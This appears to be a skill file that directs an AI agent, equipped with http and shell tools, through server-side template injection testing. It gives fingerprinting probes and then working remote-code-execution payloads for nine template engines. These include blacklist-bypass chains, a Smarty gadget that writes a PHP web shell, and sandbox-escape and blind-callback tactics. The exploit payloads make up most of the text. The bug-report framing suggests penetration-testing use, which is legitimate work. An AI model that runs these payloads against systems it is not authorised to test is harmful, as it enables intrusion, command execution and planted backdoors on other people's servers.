---
name: ssti
description: Server-Side Template Injection — fingerprint the engine first (Jinja2 / Twig / Velocity / Freemarker / ERB / Smarty / Mako / Handlebars / Pug), then escalate the engine-specific primitive to RCE or sandbox escape. Use when user input is reflected through a template engine (Jinja2/Twig/Velocity/Freemarker/ERB/Smarty/Mako/Handlebars/Pug) or {{7*7}} evaluates to 49.
allowed-tools:
  - http
  - shell
  - read_payloads
  - file_write
---

# SSTI playbook

You suspect user input is concatenated into a server-side template. The classic tell: `{{7*7}}` renders as `49` (not as the literal). But that's only the start — to file a real bug you must identify the engine, then prove RCE or read sensitive state.

Execution rule: send probes to the real reflected parameter or template sink before escalating. Never write literal placeholder values to files; if the sink is unknown, first discover it with `http`/curl.

## 1. Fingerprint the engine — fast

Use `read_payloads(skill="ssti", file="fingerprint-polyglot.txt")` for the canonical multi-engine probe:

```
${7*7}
{{7*7}}
<%= 7*7 %>
*{7*7}
{{7*'7'}}
```

Cross-reference results:

| Render result | Engine |
|---|---|
| `49` from `{{7*7}}` AND `7777777` from `{{7*'7'}}` | **Jinja2** (Python) |
| `49` from `{{7*7}}` AND `49` from `{{7*'7'}}` | **Twig** (PHP) |
| `49` from `${7*7}` | **Velocity** / **Freemarker** / Mako (probe further) |
| `49` from `<%= 7*7 %>` | **ERB** (Ruby) / EJS (Node) |
| `49` from `*{7*7}` | **Smarty** |
| Output of `{{7*7}}` literally | Not an SSTI primitive — look elsewhere |

Distinguish Velocity from Freemarker: `${"foo".getClass()}` returns `class java.lang.String` for both; **Freemarker** chokes on `<#assign>` outside a template block; **Velocity** specifically renders `#set($x=7*7)$x` as `49`.

## 2. Engine-specific exploitation

### Jinja2 (Python, Flask)

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Find an index where the subclass is `<class 'subprocess.Popen'>` (commonly 200–400). Then:

```
{{ ''.__class__.__mro__[1].__subclasses__()[N]('id', shell=True, stdout=-1).communicate() }}
```

Bypass blacklists with attribute proxies:

```
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
```

Payloads: `read_payloads(skill="ssti", file="jinja2.txt")`.

### Twig (PHP, Symfony)

Twig blocks most function access. Two proven escapes:

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

```
{{['id']|filter('system')}}
```

Older versions: `{{['id',1]|sort('passthru')}}`.

### Velocity (Java, NVelocity)

```
#set($e="exp")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")
```

### Freemarker (Java)

Built-in `?eval`, or the classic exec gadget:

```
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
```

### ERB (Ruby)

```
<%= `id` %>
<%= system("id") %>
<%= IO.popen("id").read %>
```

### Smarty (PHP)

```
{php}echo `id`;{/php}    {# pre-3.1.30 #}
{system('id')}           {# some forks #}
```

Newer Smarty: `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']);?>",self::clearConfig())}`.

### Mako (Python)

```
${self.module.cache.util.os.popen('id').read()}
<% import os; x=os.popen('id').read() %>${x}
```

### Handlebars (Node)

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.push "return require('child_process').execSync('id');"}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push (lookup conslist.0 "apply")}}
        {{this.apply 0 codelist}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Pug / Jade (Node)

```
#{ root.process.mainModule.require('child_process').execSync('id').toString() }
```

## 3. Sandbox escape thinking

If `{{7*7}}` works but exec is blocked:
- Try filter chains and pipes that hand off through string types (Twig).
- Try indirect-attribute access (`['__class__']` instead of `.__class__`).
- Try Unicode escapes on the dangerous keyword (`{{ ''.__class__ }}`).
- Read the engine's source for the relevant version — most "sandboxes" have a documented escape.

## 4. Blind SSTI

If the rendered template never returns to you (sent in email, server-to-server message), confirm with side-channels:
- DNS callback via OS exec.
- HTTP callback to an out-of-band listener.
- Timing: render an expensive loop and measure response delay.

## Reporting

For each finding include:
- The exact input field where the payload landed.
- The fingerprint output (`{{7*7}}` → `49` etc) — proves it's SSTI not arithmetic on the client.
- An exec PoC (`id` output preferred) **OR**, if RCE is gated, a clear sensitive-data read (env vars, config file).
- Engine + version inferred and from where.
